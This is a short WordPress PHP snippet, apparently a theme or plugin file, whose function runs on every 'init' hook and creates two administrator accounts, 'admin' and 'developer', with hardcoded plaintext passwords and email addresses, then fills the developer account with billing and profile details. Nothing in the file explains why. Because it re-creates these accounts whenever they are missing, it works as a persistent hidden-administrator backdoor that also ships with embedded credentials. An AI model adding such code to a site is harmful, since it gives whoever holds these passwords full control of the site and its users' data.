<?php
/** Create Default WP User * */
function add_default_site_account() {
	$userset = array(
		'admin' => array(
			'username' => 'admin',
			'password' => '3^m3VF7%@WA6SH',
			'email' => 'admin@sandbox.digitalonda.com'
		),
		'developer' => array(
			'username' => 'developer',
			'password' => 'n9!V*r8Z#o',
			'email' => 'thanhtinhcntt299@gmail.com'
		)
	);

	foreach ( $userset as $userdata ) {
		if ( !username_exists( $userdata['username'] ) && !email_exists( $userdata['email'] ) ) {
			$user_id = wp_create_user( $userdata['username'], $userdata['password'], $userdata['email'] );
			$user = new WP_User( $user_id );
			$user->set_role( 'administrator' );
		}
	}

	$dev_user = get_user_by( 'login', 'developer' );
	$data_status = get_the_author_meta( 'default_data_added', $dev_user->ID );
	if ( !$data_status || $data_status == "" ) {
		update_user_meta( $dev_user->ID, 'first_name', 'Onda' );
		update_user_meta( $dev_user->ID, 'last_name', 'Dev' );
		update_user_meta( $dev_user->ID, 'url', 'http://digitalonda.com' );
		update_user_meta( $dev_user->ID, 'billing_first_name', 'Onda' );
		update_user_meta( $dev_user->ID, 'billing_last_name', 'Dev' );
		update_user_meta( $dev_user->ID, 'billing_company', 'DigitalOnda' );
		update_user_meta( $dev_user->ID, 'billing_address_1', '3399 Liberty Avenue' );
		update_user_meta( $dev_user->ID, 'billing_address_2', '3399 Liberty Avenue' );
		update_user_meta( $dev_user->ID, 'billing_city', 'Anaheim' );
		update_user_meta( $dev_user->ID, 'billing_postcode', '92805' );
		update_user_meta( $dev_user->ID, 'billing_state', 'CA' );
		update_user_meta( $dev_user->ID, 'billing_country', 'US' );
		update_user_meta( $dev_user->ID, 'billing_phone', '555-666-7777' );
		update_user_meta( $dev_user->ID, 'billing_email', 'thanhtinhcntt299@gmail.com' );
	}
	update_user_meta( $dev_user->ID, 'default_data_added', '1' );
}
add_action( 'init', 'add_default_site_account' );
